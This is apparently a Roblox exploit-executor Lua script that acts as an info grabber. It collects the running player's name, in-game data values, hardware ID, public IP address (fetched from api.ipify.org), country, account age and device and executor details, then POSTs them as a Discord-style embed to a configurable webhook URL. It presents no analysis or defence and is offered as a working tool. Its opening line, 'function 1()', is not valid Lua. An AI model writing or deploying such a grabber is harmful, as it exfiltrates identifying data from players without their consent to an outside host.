function 1()
    
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

local function detectDevice()
    if UserInputService.TouchEnabled then
        if UserInputService:GetPlatform() == Enum.Platform.IOS then
            return "iOS"
        elseif UserInputService:GetPlatform() == Enum.Platform.Android then
            return "Android"
        else
            return "Mobile (Unknown)"
        end
    elseif UserInputService.KeyboardEnabled then
        return "PC"
    else
        return "Unknown"
    end
end

local data = player:FindFirstChild("Data")
if data then
    local embedFields = {}

    if _G.showPlayerName then
        table.insert(embedFields, { name = "·¥Ä·¥ò·¥ò ü…™·¥Ñ·¥Ä…¥·¥õ …¥·¥Ä·¥ç·¥á", value = player.Name })
    end

    for _, child in ipairs(data:GetChildren()) do
        if table.find(_G.targetNames, child.Name) and child:IsA("ValueBase") then
            table.insert(embedFields, { name = child.Name, value = child.Value or '…¥·¥è ·¥Ö·¥Ä·¥õ·¥Ä ·¥Ä·¥†·¥Ä…™ ü·¥Ä ô ü·¥á' })
        end
    end

    if _G.sendPlayerCount then
        table.insert(embedFields, { name = "·¥ò ü·¥Ä è·¥á Ä ·¥Ñ·¥è·¥ú…¥·¥õ …™…¥ s·¥á Ä·¥†·¥á Ä", value = Players.NumPlayers .. "/" .. Players.MaxPlayers })
    end

    if _G.sendMapLink then
        table.insert(embedFields, { name = "·¥ç·¥Ä·¥ò  ü…™…¥·¥ã", value = 'https://www.roblox.com/games/' .. game.PlaceId })
    end

    if _G.sendServerId then
        table.insert(embedFields, { name = "s·¥á Ä·¥†·¥á Ä …™·¥Ö", value = game.JobId })
    end

    if _G.sendHWID then
        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        table.insert(embedFields, { name = " ú·¥°…™·¥Ö", value = hwid })
    end

    if _G.sendIP then
        local ip = game:HttpGet("https://api.ipify.org")
        table.insert(embedFields, { name = "…™·¥ò ·¥Ä·¥Ö·¥Ö Ä·¥áss", value = ip })
    end

    if _G.sendCountryFlag then
        local api = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))
        local countryFlag = api.flag.emoji
        local countryName = api.country
        table.insert(embedFields, { name = "·¥Ñ·¥è·¥ú…¥·¥õ Ä è", value = countryFlag .. " " .. countryName })
    end

    if _G.sendAccountAge then
        local accountCreationDate = player.AccountAge
        table.insert(embedFields, { name = "·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ ·¥Ä…¢·¥á", value = tostring(accountCreationDate) .. " ·¥Ö·¥Ä ès" })
    end

    if _G.sendExecutorInfo and identifyexecutor then
        local executorName, executorVersion = identifyexecutor()
        table.insert(embedFields, { name = "·¥áx·¥á·¥Ñ·¥ú·¥õ·¥è Ä", value = executorName .. " (Version: " .. executorVersion .. ")" })
    else
        table.insert(embedFields, { name = "·¥áx·¥á·¥Ñ·¥ú·¥õ·¥è Ä", value = "·¥ú…¥·¥Ä ô ü·¥á ·¥õ·¥è ·¥Ö·¥á·¥õ·¥á·¥Ñ·¥õ" })
    end

    if _G.sendDeviceInfo then
        local deviceInfo = detectDevice()
        table.insert(embedFields, { name = "·¥Ö·¥á·¥†…™·¥Ñ·¥á …™…¥“ì·¥è", value = deviceInfo })
    end

    local OSTime = os.time()
    local Time = os.date('!*t', OSTime)
    local Embed = {
        title = '·¥ò ü·¥Ä è·¥á Ä …™…¥“ì·¥è Ä·¥ç·¥Ä·¥õ…™·¥è…¥',
        color = 99999,
        footer = { text = 'by game tool' },
        author = { name = 'üéì', url = 'https://www.roblox.com/' },
        fields = embedFields,
        timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
    }

    (syn and syn.request or http_request) {
        Url = _G.webhookUrl,
        Method = 'POST',
        Headers = {
            ['Content-Type'] = 'application/json',
        },
        Body = game:GetService'HttpService':JSONEncode({ embeds = { Embed } }),
    }
end
end
